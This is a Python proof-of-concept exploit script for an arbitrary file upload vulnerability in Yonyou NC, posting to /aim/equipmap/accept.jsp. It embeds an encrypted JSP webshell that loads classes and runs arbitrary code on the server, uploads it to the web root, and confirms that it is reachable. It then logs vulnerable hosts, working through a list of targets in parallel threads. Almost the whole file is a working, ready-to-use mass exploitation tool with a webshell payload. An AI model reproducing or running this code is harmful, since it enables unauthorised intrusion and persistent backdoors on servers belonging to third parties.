# POC.py

import requests
import threading
import argparse

webshell = """
<%! String xc = "dfff0a7fa1a55c8c";class X extends ClassLoader {public X(ClassLoader z) {super(z); }public Class Q(byte[] cb) {return super.defineClass(cb, 0, cb.length);}}public byte[] x(byte[] s, boolean m) {try {javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");Class<?> aClass = Class.forName("javax.crypto.spec.SecretKeySpec");java.lang.reflect.Constructor<?>constructor = aClass.getConstructor(byte[].class, String.class);javax.crypto.spec.SecretKeySpec skeySpec = (javax.crypto.spec.SecretKeySpec) constructor.newInstance(xc.getBytes(), "AES");c.init(m ? 1 : 2, skeySpec);byte[] result = (byte[]) c.getClass()./*Z65A8Uf850*/getDeclaredMethod/*Z65A8Uf850*/("doFinal", new Class[]{byte[].class}).invoke(c, new Object[]{s});return result; } catch (Exception e) {return null;}} %><%  try {byte[] Ck05 = new byte[Integer.parseInt(request.getHeader("Content-Length"))]; java.io.InputStream inputStream = request.getInputStream(); int _num = 0; while ((_num += inputStream.read(Ck05, _num, Ck05.length)) < Ck05.length) ; Ck05 = x(Ck05, false); if (session.getAttribute("payload") == null) {session.setAttribute("payload", new X(Thread.currentThread()./*Z65A8Uf850*/getContextClassLoader()).Q(Ck05)); } else {request.setAttribute("parameters", Ck05);Object f = ((Class) session.getAttribute("payload")).newInstance();java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();f.equals(/*Z65A8Uf850*/arrOut);f.equals(/*Z65A8Uf850*/pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true)); }} catch (Exception e) {} %>
"""
file = {
    "sample_file": "<% out.println('hello young nc');%>",
    "Content-Type": "application/octet-stream",
    "Content-Disposition": "form-data",
    "filename" : webshell
}
data = {
        'fname': "\\webapps\\nc_web\\asdwqe5478.jsp"
}
headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0",
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        'Accept-Language': "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        'Accept-Encoding': "gzip, deflate",
        'Connection': "close",
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'multipart/form-data'
}

def arrange_url(url_y):
    if url_y.startswith('http://') or url_y.startswith('https://'):
        url = url_y + "/aim/equipmap/accept.jsp"
    else:
        url = "http://" + url_y + "/aim/equipmap/accept.jsp"
    return url
def arrange_exp_url(url_y):
    if url_y.startswith('http://') or url_y.startswith('https://'):
        exp = url_y + "/asdwqe5478.jsp"
    else:
        exp = "http://" + url_y + "/asdwqe5478.jsp"
    return exp
def req(url_y):
    url = arrange_url(url_y)
    # print(url)
    exp = arrange_exp_url(url_y)
    # print(exp)
    try:
        response = requests.get(url, verify=False, timeout=10)
        if response.status_code == 200:
            print("[-]-[-]" + '可能存在漏洞地址:' + url)
    except Exception as e:
        print('链接超时')
def exp(url_y):
    url = arrange_url(url_y)
    # print(url)
    exp = arrange_exp_url(url_y)
    try:
        requests.post(url, headers=headers, data=data, files=file, timeout=10)
        rp = requests.get(exp, verify=False, timeout=10)
        if rp.status_code == 200:
            print("存在用友NC 任意文件上传漏洞")
            print("[+]漏洞地址为: " + exp)
            print("[--]" + "可能存在误差,可根据46行状态码进行修改检测," + "[--]")
            with open('poc_url.txt', 'a') as f1:
                f1.write(exp + '\r')
        else:
            print("上传失败")
            print("不存在用友NC 任意文件上传漏洞")
    except:
        print('链接超时')
def expolit(url):
    req(url)
    exp(url)
if __name__ == '__main__':
    parser = argparse.ArgumentParser(usage='OPTIONS... -f', description='python -f <type>')
    parser.add_argument('-f', type=str, help='<type>')
    args = parser.parse_args()
    f = open(args.f, 'r')
    threadpool = []
    for i in f.readlines():
        th = threading.Thread(target=expolit, args=((i[:-1]),))
        threadpool.append(th)
    for th in threadpool:
        th.start()
    for th in threadpool:
        threading.Thread.join(th)
